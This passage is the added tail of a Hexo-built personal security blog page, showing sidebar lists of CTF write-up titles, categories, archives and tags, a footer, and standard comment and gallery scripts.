+        <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
+        </a>
+    
+</nav>
+
+    
+    <div class="widgets-container">
+        
+            
+                
+    <div class="widget-wrap">
+        <h3 class="widget-title">recents</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2021/05/16/Frag-Attacks/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/2021/05/16/Frag-Attacks/title.png)" alt="Frag Attacks" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Hacking/">Hacking</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/Hacking/Network/">Network</a></p>
+                            <p class="item-title"><a href="/2021/05/16/Frag-Attacks/" class="title">Frag Attacks</a></p>
+                            <p class="item-date"><time datetime="2021-05-16T10:12:38.000Z" itemprop="datePublished">2021-05-16</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/09/27/2020-CCE-cms-again/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/2020/09/27/2020-CCE-cms-again/0.png)" alt="2020 CCE - cms again" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Hacking/">Hacking</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/Hacking/Web/">Web</a></p>
+                            <p class="item-title"><a href="/2020/09/27/2020-CCE-cms-again/" class="title">2020 CCE - cms again</a></p>
+                            <p class="item-date"><time datetime="2020-09-26T15:00:00.000Z" itemprop="datePublished">2020-09-27</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/09/27/2020-CCE-Wordpresso/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/2020/09/27/2020-CCE-Wordpresso/0.png)" alt="2020 CCE - Wordpresso" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Hacking/">Hacking</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/Hacking/Web/">Web</a></p>
+                            <p class="item-title"><a href="/2020/09/27/2020-CCE-Wordpresso/" class="title">2020 CCE - Wordpresso</a></p>
+                            <p class="item-date"><time datetime="2020-09-26T15:00:00.000Z" itemprop="datePublished">2020-09-27</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/09/27/2020-CCE-nomorephp/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/2020/09/27/2020-CCE-nomorephp/0.png)" alt="2020 CCE - nomorephp" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Hacking/">Hacking</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/Hacking/Web/">Web</a></p>
+                            <p class="item-title"><a href="/2020/09/27/2020-CCE-nomorephp/" class="title">2020 CCE - nomorephp</a></p>
+                            <p class="item-date"><time datetime="2020-09-26T15:00:00.000Z" itemprop="datePublished">2020-09-27</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/09/13/2020-Cyberoc-Vaccine-Paper/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/2020/09/13/2020-Cyberoc-Vaccine-Paper/10.png)" alt="2020 Cyberoc - Vaccine Paper (Web)" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Hacking/">Hacking</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/Hacking/Web/">Web</a></p>
+                            <p class="item-title"><a href="/2020/09/13/2020-Cyberoc-Vaccine-Paper/" class="title">2020 Cyberoc - Vaccine Paper (Web)</a></p>
+                            <p class="item-date"><time datetime="2020-09-12T15:00:00.000Z" itemprop="datePublished">2020-09-13</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">categories</h3>
+        <div class="widget">
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Development/">Development</a><span class="category-list-count">11</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Development/Algorithm/">Algorithm</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Development/iOS/">iOS</a><span class="category-list-count">5</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/">Hacking</a><span class="category-list-count">60</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Crpto/">Crpto</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Crypto/">Crypto</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Forensic/">Forensic</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Misc/">Misc</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Network/">Network</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Pwnable/">Pwnable</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Reversing/">Reversing</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Web/">Web</a><span class="category-list-count">15</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Question/">Question</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Story/">Story</a><span class="category-list-count">3</span></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">arxius</h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a><span class="archive-list-count">18</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a><span class="archive-list-count">2</span></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">etiquetes</h3>
+        <div class="widget">
+            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0ctf-2017/">0ctf 2017</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/2020-CCE/">2020 CCE</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/2020-Cyberoc/">2020 Cyberoc</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithm/">Algorithm</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/">C</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/">C++</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Code-Blue-CTF-2018-Quals/">Code Blue CTF 2018 Quals</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Codegate-CTF-2018-Final/">Codegate CTF 2018 Final</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Codegate-CTF-2018-Preliminary/">Codegate CTF 2018 Preliminary</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Codegate-CTF-2020-Preliminary/">Codegate CTF 2020 Preliminary</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/">Crypto</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DEF-CON-CTF-Qualifier-2017/">DEF CON CTF Qualifier 2017</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DEFCON-2018/">DEFCON 2018</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FBCTF-2019/">FBCTF 2019</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HDCON-2017/">HDCON 2017</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HITCON-CTF-2017/">HITCON CTF 2017</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Harekaze-CTF/">Harekaze CTF</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Maplestory/">Maplestory</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Math/">Math</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PCTF-2018/">PCTF 2018</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Project/">Project</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SHA-1/">SHA-1</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SHA2017-CTF/">SHA2017 CTF</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Samsung-CTF-PreQuals-2017/">Samsung CTF PreQuals 2017</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Samsung-CTF-PreQuals-2018/">Samsung CTF PreQuals 2018</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Samsung-CTF-Quals-2018/">Samsung CTF Quals 2018</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/TAMU-CTF/">TAMU CTF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Whitehat-Contest-2018-PreQual/">Whitehat Contest 2018 PreQual</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Whitehat-contest-2017-PreQual/">Whitehat contest 2017 PreQual</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WiFi/">WiFi</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/defcon/">defcon</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iOS/">iOS</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-kr/">pwnable.kr</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/zer0pts-ctf-2020/">zer0pts ctf 2020</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/크리스마스-CTF/">크리스마스 CTF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/화이트해커리그/">화이트해커리그</a><span class="tag-list-count">1</span></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-float">
+        <h3 class="widget-title">etiqueta cloud</h3>
+        <div class="widget tagcloud">
+            <a href="/tags/0ctf-2017/" style="font-size: 10px;">0ctf 2017</a> <a href="/tags/2020-CCE/" style="font-size: 13.33px;">2020 CCE</a> <a href="/tags/2020-Cyberoc/" style="font-size: 10px;">2020 Cyberoc</a> <a href="/tags/Algorithm/" style="font-size: 18.33px;">Algorithm</a> <a href="/tags/C/" style="font-size: 10px;">C</a> <a href="/tags/C/" style="font-size: 10px;">C++</a> <a href="/tags/Code-Blue-CTF-2018-Quals/" style="font-size: 11.67px;">Code Blue CTF 2018 Quals</a> <a href="/tags/Codegate-CTF-2018-Final/" style="font-size: 11.67px;">Codegate CTF 2018 Final</a> <a href="/tags/Codegate-CTF-2018-Preliminary/" style="font-size: 20px;">Codegate CTF 2018 Preliminary</a> <a href="/tags/Codegate-CTF-2020-Preliminary/" style="font-size: 10px;">Codegate CTF 2020 Preliminary</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/DEF-CON-CTF-Qualifier-2017/" style="font-size: 11.67px;">DEF CON CTF Qualifier 2017</a> <a href="/tags/DEFCON-2018/" style="font-size: 10px;">DEFCON 2018</a> <a href="/tags/FBCTF-2019/" style="font-size: 10px;">FBCTF 2019</a> <a href="/tags/HDCON-2017/" style="font-size: 10px;">HDCON 2017</a> <a href="/tags/HITCON-CTF-2017/" style="font-size: 10px;">HITCON CTF 2017</a> <a href="/tags/Harekaze-CTF/" style="font-size: 11.67px;">Harekaze CTF</a> <a href="/tags/Maplestory/" style="font-size: 10px;">Maplestory</a> <a href="/tags/Math/" style="font-size: 13.33px;">Math</a> <a href="/tags/PCTF-2018/" style="font-size: 13.33px;">PCTF 2018</a> <a href="/tags/Project/" style="font-size: 10px;">Project</a> <a href="/tags/SHA-1/" style="font-size: 10px;">SHA-1</a> <a href="/tags/SHA2017-CTF/" style="font-size: 15px;">SHA2017 CTF</a> <a href="/tags/Samsung-CTF-PreQuals-2017/" style="font-size: 16.67px;">Samsung CTF PreQuals 2017</a> <a href="/tags/Samsung-CTF-PreQuals-2018/" style="font-size: 11.67px;">Samsung CTF PreQuals 2018</a> <a href="/tags/Samsung-CTF-Quals-2018/" style="font-size: 13.33px;">Samsung CTF Quals 2018</a> <a href="/tags/TAMU-CTF/" style="font-size: 10px;">TAMU CTF</a> <a href="/tags/Whitehat-Contest-2018-PreQual/" style="font-size: 11.67px;">Whitehat Contest 2018 PreQual</a> <a href="/tags/Whitehat-contest-2017-PreQual/" style="font-size: 10px;">Whitehat contest 2017 PreQual</a> <a href="/tags/WiFi/" style="font-size: 10px;">WiFi</a> <a href="/tags/defcon/" style="font-size: 10px;">defcon</a> <a href="/tags/iOS/" style="font-size: 16.67px;">iOS</a> <a href="/tags/pwnable-kr/" style="font-size: 10px;">pwnable.kr</a> <a href="/tags/zer0pts-ctf-2020/" style="font-size: 10px;">zer0pts ctf 2020</a> <a href="/tags/크리스마스-CTF/" style="font-size: 10px;">크리스마스 CTF</a> <a href="/tags/화이트해커리그/" style="font-size: 10px;">화이트해커리그</a>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">links</h3>
+        <div class="widget">
+            <ul>
+                
+            </ul>
+        </div>
+    </div>
+
+
+            
+        
+    </div>
+</aside>
+                </div>
+            </div>
+        </div>
+        <footer id="footer">
+    <div class="container">
+        <div class="container-inner">
+            <a id="back-to-top" href="javascript:;"><i class="icon fa fa-angle-up"></i></a>
+            <div class="credit">
+                <!--
+                <h1 class="logo-wrap">
+                    <a href="/" class="logo"></a>
+                </h1>
+            -->
+                <p>&copy; 2021 Youngho Kim</p>
+                <p>Powered by <a href="//hexo.io/" target="_blank">Hexo</a>. Theme by <a href="//github.com/ppoffice" target="_blank">PPOffice</a></p>
+            </div>
+        </div>
+    </div>
+</footer>
+        
+    
+    <script>
+    var disqus_shortname = 'm1ku';
+    
+    
+    var disqus_url = 'https://kimtruth.github.io/2020/05/24/defcon-28-uploooadit/';
+    
+    (function() {
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+
+
+
+
+    
+        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
+    
+    
+        <script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+    
+    
+
+
+
+<!-- Custom Scripts -->
+<script src="/js/main.js"></script>
+
+    </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config("");
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="custom_mathjax_source">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
